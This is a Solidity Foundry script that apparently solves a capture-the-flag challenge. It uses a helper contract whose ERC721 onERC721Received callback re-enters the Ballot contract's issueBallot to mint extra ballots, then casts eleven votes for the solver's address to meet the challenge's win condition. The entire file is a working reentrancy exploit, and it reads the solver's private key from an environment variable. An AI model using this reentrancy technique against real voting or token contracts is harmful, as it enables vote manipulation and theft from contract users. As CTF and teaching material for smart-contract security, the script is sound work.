// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import { VmSafe } from "forge-std/Vm.sol";
import { Script } from "forge-std/Script.sol";
import { Setup } from "../src/Setup.sol";
import { Ballot } from "../src/Ballot.sol";
import { ERC721 } from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ExploitHelper is IERC721Receiver {
  uint256 private constant VOTE_REQUIRED = 11;
  uint256 private cnt;
  Ballot public ballot;

  constructor(Setup chall, Ballot _ballot) {
    ballot = _ballot;
    chall.register();
  }

  function exploit(address to) public {
    ballot.issueBallot();
    for (uint256 id = 1; id <= VOTE_REQUIRED; id++) {
      ballot.voteForCandidate(id, to);
    }
  }

  function onERC721Received(address, address, uint256, bytes calldata) public returns (bytes4) {
    if (cnt <= VOTE_REQUIRED) {
      cnt += 1;
      ballot.issueBallot();
    }
    return IERC721Receiver.onERC721Received.selector;
  }
}

contract Exploit is Script {
  Setup public chall;
  Ballot public ballot;
  VmSafe.Wallet public solver;

  function setUp() public {
    chall = Setup(vm.envAddress("setup_contract_address"));
    ballot = chall.ballot();
    solver = vm.createWallet(uint256(vm.envBytes32("user_private_key")));
  }

  function run() public {
    vm.startBroadcast(solver.privateKey);

    ExploitHelper h = new ExploitHelper(chall, ballot);
    h.exploit(solver.addr);

    require(chall.isSolved(), "Not solved!");
  }
}
